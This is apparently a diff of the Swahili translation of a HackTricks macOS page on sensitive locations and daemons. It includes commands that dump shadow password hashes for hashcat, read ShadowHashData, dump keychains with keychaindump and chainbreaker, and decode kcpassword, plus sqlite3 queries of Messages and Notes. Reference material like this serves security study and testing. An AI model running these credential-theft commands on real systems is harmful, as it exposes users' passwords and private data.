@@ -1,8 +1,8 @@
 # macOS Sensitive Locations & Interesting Daemons
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -19,8 +19,8 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 ### Nywila za Kivuli
 
-Nywila ya kivuli inahifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizoko **`/var/db/dslocal/nodes/Default/users/`**.\
-Mfuatano ufuatao unaweza kutumika kutoa **habari zote kuhusu watumiaji** (ikiwemo habari za hash): 
+Nywila za kivuli huhifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizoko katika **`/var/db/dslocal/nodes/Default/users/`**.\
+Mstari ufuatao unaweza kutumika kutoa **habari zote kuhusu watumiaji** (ikiwemo habari za hash): 
 
 {% code overflow="wrap" %}
 ```bash
@@ -30,7 +30,7 @@ for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"
 
 [**Scripts kama hii**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) au [**hii**](https://github.com/octomagon/davegrohl.git) zinaweza kutumika kubadilisha hash kuwa **hashcat** **format**.
 
-Mstari mbadala mmoja ambao utatoa creds za akaunti zote zisizo za huduma katika format ya hashcat `-m 7100` (macOS PBKDF2-SHA512):
+Mstari mbadala ambao utaondoa creds za akaunti zote zisizo za huduma katika format ya hashcat `-m 7100` (macOS PBKDF2-SHA512):
 
 {% code overflow="wrap" %}
 ```bash
@@ -38,9 +38,15 @@ sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex
 ```
 {% endcode %}
 
+Njia nyingine ya kupata `ShadowHashData` ya mtumiaji ni kwa kutumia `dscl`: ``sudo dscl . -read /Users/`whoami` ShadowHashData``
+
+### /etc/master.passwd
+
+Faili hii inatumika **tu** wakati mfumo unakimbia katika **mode ya mtumiaji mmoja** (hivyo si mara nyingi sana).
+
 ### Keychain Dump
 
-Kumbuka kwamba unapotumia binary ya usalama **kutoa nywila zilizofichuliwa**, maelekezo kadhaa yatauliza mtumiaji kuruhusu operesheni hii.
+Kumbuka kwamba unapokuwa unatumia binary ya usalama **kudondosha nywila zilizotafsiriwa**, maelekezo kadhaa yatauliza mtumiaji kuruhusu operesheni hii.
 ```bash
 #security
 security dump-trust-settings [-s] [-d] #List certificates
@@ -57,13 +63,13 @@ Kulingana na maoni haya [juuso/keychaindump#10 (comment)](https://github.com/juu
 
 ### Muhtasari wa Keychaindump
 
-Zana inayoitwa **keychaindump** imeandaliwa kutoa nywila kutoka kwa funguo za macOS, lakini inakabiliwa na vizuizi katika toleo jipya la macOS kama Big Sur, kama ilivyoelezwa katika [majadiliano](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji mshambuliaji kupata ufikiaji na kupandisha mamlaka hadi **root**. Zana hii inatumia ukweli kwamba funguo za macOS zimefunguliwa kwa default wakati wa kuingia kwa mtumiaji kwa urahisi, ikiruhusu programu kufikia bila kuhitaji nywila ya mtumiaji mara kwa mara. Hata hivyo, ikiwa mtumiaji atachagua kufunga funguo zao baada ya kila matumizi, **keychaindump** inakuwa isiyo na ufanisi.
+Zana inayoitwa **keychaindump** imeandaliwa kutoa nywila kutoka kwa funguo za macOS, lakini inakabiliwa na vizuizi katika toleo jipya la macOS kama Big Sur, kama ilivyoelezwa katika [majadiliano](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji mshambuliaji kupata ufikiaji na kuongeza mamlaka hadi **root**. Zana hii inatumia ukweli kwamba funguo za macOS zimefunguliwa kwa default wakati wa kuingia kwa mtumiaji kwa urahisi, ikiruhusu programu kufikia bila kuhitaji nywila ya mtumiaji mara kwa mara. Hata hivyo, ikiwa mtumiaji atachagua kufunga funguo zao baada ya kila matumizi, **keychaindump** inakuwa isiyo na ufanisi.
 
-**Keychaindump** inafanya kazi kwa kulenga mchakato maalum unaoitwa **securityd**, ambao Apple inaelezea kama daemon waidhinishaji na shughuli za kificho, muhimu kwa kufikia funguo. Mchakato wa kutoa nywila unajumuisha kutambua **Master Key** inayotokana na nywila ya kuingia ya mtumiaji. Funguo hii ni muhimu kwa kusoma faili ya funguo. Ili kupata **Master Key**, **keychaindump** inachanganua kumbukumbu ya **securityd** kwa kutumia amri ya `vmmap`, ikitafuta funguo zinazoweza kuwa ndani ya maeneo yaliyoashiriwa kama `MALLOC_TINY`. Amri ifuatayo inatumika kukagua maeneo haya ya kumbukumbu:
+**Keychaindump** inafanya kazi kwa kulenga mchakato maalum unaoitwa **securityd**, ambao Apple inaelezea kama daemon wa mamlaka na operesheni za kificho, muhimu kwa kufikia funguo. Mchakato wa kutoa nywila unajumuisha kutambua **Master Key** inayotokana na nywila ya kuingia ya mtumiaji. Funguo hii ni muhimu kwa kusoma faili ya funguo. Ili kupata **Master Key**, **keychaindump** inachanganua kumbukumbu ya **securityd** kwa kutumia amri ya `vmmap`, ikitafuta funguo zinazoweza kuwa ndani ya maeneo yaliyoashiriwa kama `MALLOC_TINY`. Amri ifuatayo inatumika kukagua maeneo haya ya kumbukumbu:
 ```bash
 sudo vmmap <securityd PID> | grep MALLOC_TINY
 ```
-Baada ya kubaini funguo kuu zinazoweza kuwa, **keychaindump** inatafuta kupitia makundi kwa mfano maalum (`0x0000000000000018`) unaoashiria mgombea wa funguo kuu. Hatua zaidi, ikiwa ni pamoja na kuondoa ufichuzi, zinahitajika ili kutumia funguo hii, kama ilivyoainishwa katika msimbo wa chanzo wa **keychaindump**. Wachambuzi wanaolenga eneo hili wanapaswa kuzingatia kwamba data muhimu ya kufichua funguo za keychain inahifadhiwa ndani ya kumbukumbu ya mchakato wa **securityd**. Mfano wa amri ya kuendesha **keychaindump** ni:
+Baada ya kubaini funguo kuu zinazoweza kuwa, **keychaindump** inatafuta kupitia makundi kwa mfano maalum (`0x0000000000000018`) unaoashiria mgombea wa funguo kuu. Hatua zaidi, ikiwa ni pamoja na kuondoa ufichaji, zinahitajika ili kutumia funguo hii, kama ilivyoainishwa katika msimbo wa chanzo wa **keychaindump**. Wachambuzi wanaolenga eneo hili wanapaswa kuzingatia kwamba data muhimu ya kufichua funguo za keychain inahifadhiwa ndani ya kumbukumbu ya mchakato wa **securityd**. Mfano wa amri ya kuendesha **keychaindump** ni:
 ```bash
 sudo ./keychaindump
 ```
@@ -71,16 +77,16 @@ sudo ./keychaindump
 
 [**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutumika kutoa aina zifuatazo za taarifa kutoka kwa keychain ya OSX kwa njia ya forensically sound:
 
-* Nywila ya Keychain iliyohashwa, inayofaa kwa ajili ya kuvunja kwa kutumia [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
-* Nywila za Mtandao
-* Nywila za Kawaida
+* Nenosiri la Keychain lililohashwa, linalofaa kwa ajili ya kuvunja kwa kutumia [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
+* Nenosiri za Mtandao
+* Nenosiri za Kawaida
 * Funguo Binafsi
 * Funguo za Umma
 * Vyeti vya X509
 * Maelezo Salama
-* Nywila za Appleshare
+* Nenosiri za Appleshare
 
-Ikiwa kuna nywila ya kufungua keychain, funguo kuu iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama SystemKey, Chainbreaker pia itatoa nywila za maandiko.
+Ikiwa kuna nenosiri la kufungua keychain, funguo kuu iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama SystemKey, Chainbreaker pia itatoa nenosiri za maandiko.
 
 Bila moja ya hizi mbinu za kufungua Keychain, Chainbreaker itaonyesha taarifa nyingine zote zinazopatikana.
 
@@ -106,9 +112,9 @@ hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
 # Use the key to decrypt the passwords
 python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
 ```
-#### **Dondoa funguo za keychain (pamoja na nywila) kwa kutumia dump ya kumbukumbu**
+#### **Dondoa funguo za keychain (pamoja na nywila) kwa kutumia memory dump**
 
-[Fuata hatua hizi](../#dumping-memory-with-osxpmem) ili kufanya **dump ya kumbumbu**
+[Fuata hatua hizi](../#dumping-memory-with-osxpmem) ili kufanya **memory dump**
 ```bash
 #Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
 # Unformtunately volafox isn't working with the latest versions of MacOS
@@ -129,11 +135,11 @@ python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library
 Faili la **kcpassword** ni faili linaloshikilia **nenosiri la kuingia la mtumiaji**, lakini tu ikiwa mmiliki wa mfumo ame **wezeshwa kuingia kiotomatiki**. Hivyo, mtumiaji ataingia kiotomatiki bila kuulizwa nenosiri (ambayo si salama sana).
 
 Nenosiri linahifadhiwa katika faili **`/etc/kcpassword`** xored na ufunguo **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ikiwa nenosiri la mtumiaji ni refu zaidi ya ufunguo, ufunguo utarudiwa.\
-Hii inafanya nenosiri kuwa rahisi kurejesha, kwa mfano kwa kutumia scripts kama [**hii**](https://gist.github.com/opshope/32f65875d45215c3677d).
+Hii inafanya nenosiri kuwa rahisi kurejesha, kwa mfano kwa kutumia scripts kama [**hii moja**](https://gist.github.com/opshope/32f65875d45215c3677d).
 
 ## Taarifa za Kuvutia katika Maktaba
 
-### Meseji
+### Ujumbe
 ```bash
 sqlite3 $HOME/Library/Messages/chat.db .tables
 sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
@@ -167,23 +173,59 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 ```
 {% endcode %}
 
-## Mipangilio
+## Preferences
 
-Katika programu za macOS, mipangilio iko katika **`$HOME/Library/Preferences`** na katika iOS iko katika `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;
+Katika programu za macOS, mapendeleo yanapatikana katika **`$HOME/Library/Preferences`** na katika iOS yanapatikana katika `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
 
-Katika macOS, zana ya cli **`defaults`** inaweza kutumika kubadilisha **faili ya Mipangilio**.
+Katika macOS, zana ya cli **`defaults`** inaweza kutumika kubadilisha **faili za Mapendeleo**.
 
-**`/usr/sbin/cfprefsd`** inadai huduma za XPC `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent` na inaweza kuitwa kufanya vitendo kama kubadilisha mipangilio.
+**`/usr/sbin/cfprefsd`** inadai huduma za XPC `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent` na inaweza kuitwa kufanya vitendo kama kubadilisha mapendeleo.
 
-## Arifa za Mfumo
+## OpenDirectory permissions.plist
 
-### Arifa za Darwin
+Faili `/System/Library/OpenDirectory/permissions.plist` ina ruhusa zinazotumika kwenye sifa za node na inalindwa na SIP.\
+Faili hii inatoa ruhusa kwa watumiaji maalum kwa UUID (na si uid) ili waweze kufikia taarifa nyeti maalum kama `ShadowHashData`, `HeimdalSRPKey` na `KerberosKeys` miongoni mwa zingine:
+```xml
+[...]
+<key>dsRecTypeStandard:Computers</key>
+<dict>
+<key>dsAttrTypeNative:ShadowHashData</key>
+<array>
+<dict>
+<!-- allow wheel even though it's implicit -->
+<key>uuid</key>
+<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
+<key>permissions</key>
+<array>
+<string>readattr</string>
+<string>writeattr</string>
+</array>
+</dict>
+</array>
+<key>dsAttrTypeNative:KerberosKeys</key>
+<array>
+<dict>
+<!-- allow wheel even though it's implicit -->
+<key>uuid</key>
+<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
+<key>permissions</key>
+<array>
+<string>readattr</string>
+<string>writeattr</string>
+</array>
+</dict>
+</array>
+[...]
+```
+## System Notifications
 
-Daemoni kuu ya arifa ni **`/usr/sbin/notifyd`**. Ili kupokea arifa, wateja lazima wajisajili kupitia bandari ya Mach `com.apple.system.notification_center` (angalia kwa `sudo lsmp -p <pid notifyd>`). Daemoni inaweza kuundwa kwa faili `/etc/notify.conf`.
+### Darwin Notifications
 
-Majina yanayotumika kwa arifa ni alama za kipekee za DNS za kinyume na wakati arifa inatumwa kwa moja yao, mteja(wa) ambao umeonyesha wanaweza kushughulikia itapokea.
+Daemoni kuu wa arifa ni **`/usr/sbin/notifyd`**. Ili kupokea arifa, wateja lazima wajisajili kupitia bandari ya Mach `com.apple.system.notification_center` (angalia kwa `sudo lsmp -p <pid notifyd>`). Daemoni inaweza kusanidiwa kwa faili `/etc/notify.conf`.
 
-Inawezekana kutoa hali ya sasa (na kuona majina yote) kwa kutuma ishara SIGUSR2 kwa mchakato wa notifyd na kusoma faili iliyozalishwa: `/var/run/notifyd_<pid>.status`:
+Majina yanayotumika kwa arifa ni alama za kipekee za DNS za kinyume na wakati arifa inatumwa kwa moja yao, mteja(wateja) ambao wameonyesha wanaweza kushughulikia hiyo watapokea.
+
+Inawezekana kutupa hali ya sasa (na kuona majina yote) kwa kutuma ishara SIGUSR2 kwa mchakato wa notifyd na kusoma faili lililotengenezwa: `/var/run/notifyd_<pid>.status`:
 ```bash
 ps -ef | grep -i notifyd
 0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd
@@ -224,11 +266,11 @@ Hizi ni arifa ambazo mtumiaji anapaswa kuona kwenye skrini:
 
 * **`CFUserNotification`**: API hii inatoa njia ya kuonyesha kwenye skrini pop-up yenye ujumbe.
 * **Bodi ya Tangazo**: Hii inaonyesha kwenye iOS bendera inayotoweka na itahifadhiwa kwenye Kituo cha Arifa.
-* **`NSUserNotificationCenter`**: Hii ni bodi ya tangazo ya iOS kwenye MacOS. Hifadhidata yenye arifa iko katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
+* **`NSUserNotificationCenter`**: Hii ni bodi ya tangazo ya iOS kwenye MacOS. Hifadhidata ya arifa iko katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
